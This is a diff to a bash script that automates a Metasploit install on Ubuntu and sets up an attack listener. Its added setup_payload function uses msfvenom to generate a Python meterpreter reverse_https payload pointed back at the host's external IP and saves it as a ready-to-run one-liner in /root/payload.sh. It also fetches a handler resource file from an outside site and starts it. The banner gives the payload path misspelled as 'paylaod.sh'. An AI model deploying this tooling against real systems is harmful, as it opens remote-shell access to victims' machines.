@@ -24,7 +24,7 @@ install_pg ()
   wget --quiet -O - https://www.postgresql.org/media/keys/ACCC4CF8.asc | apt-key add -
   apt-get update
   echo "deb http://apt.postgresql.org/pub/repos/apt/ $(lsb_release -cs)-pgdg main" > /etc/apt/sources.list.d/pgdg.list
-  apt-get -y install postgresql-9.4 postgresql-client-9.4 postgresql-contrib-9.4
+  apt-get -y install postgresql-9.3 postgresql-client-9.3 postgresql-contrib-9.3
 }
 #----------------------------------------------------------------------------------------------------------------------
 install_deps ()
@@ -84,6 +84,7 @@ ubuntu_rvm ()
   rvm autolibs enable
   rvm install $SYSTEM_RUBY_VERSION -- --with-jemalloc
   rvm use $SYSTEM_RUBY_VERSION@$SYSTEM_RUBY_GEMSET --default --create
+  gem install bundler
   ubuntu_log_info "Finished installing RVM!"
 }
 #----------------------------------------------------------------------------------------------------------------------
@@ -119,6 +120,7 @@ setup_postgres ()
 setup_msf ()
 {
   cd $3
+  gem install bundler
   bundle install
   cp $3/config/database.yml.example $3/config/database.yml
   sed -i 's/username: \metasploit_framework_development/username: msfuser/g' $3/config/database.yml
@@ -136,10 +138,19 @@ setup_screen ()
 #----------------------------------------------------------------------------------------------------------------------
 setup_handler ()
 {
-  curl -o /root/msf.rc http://alexlevinson.com/handler.txt
+  curl -o /root/msf.rc http://alexlevinson.com/pyhandler.txt
   tmux new -s msf -d
   tmux send -t msf "cd /opt/metasploit" ENTER
   tmux send -t msf "ruby -W0 msfconsole -q -r /root/msf.rc" ENTER
+}
+#----------------------------------------------------------------------------------------------------------------------
+setup_payload ()
+{
+  cd /opt/metasploit
+  EXTERNAL_IP=$(curl -s icanhazip.com)
+  ruby -W0 msfvenom -p python/meterpreter/reverse_https -f raw -o /root/py_payload.raw LHOST=$EXTERNAL_IP LPORT=443
+  RAW_PAYLOAD=$(cat /root/py_payload.raw)
+  echo "/usr/bin/python -c \"$RAW_PAYLOAD\"" > /root/payload.sh
 }
 #----------------------------------------------------------------------------------------------------------------------
 supbrah ()
@@ -151,6 +162,8 @@ supbrah ()
   echo "|_|  |_|____/|_|    "
   echo "Happy MSF nonsense  "
   echo "[*] MSF Location: $1"
+  echo "[*] Py Payload: /root/paylaod.sh"
+  echo "[*] Connect to Handler: tmux a -t msf"
   echo "[*] "
   echo "[!] NOTE: You will need to logout and log back in to finalize changes!!!"
   echo "[*] "
@@ -169,5 +182,6 @@ echo '2.2.3' > $MSF_PATH/.ruby-version
 setup_msf $MSF_PASSWORD $MSF_PASSWORDTESTUSER $MSF_PATH
 setup_screen
 setup_handler
+setup_payload
 supbrah $MSF_PATH
 #----------------------------------------------------------------------------------------------------------------------
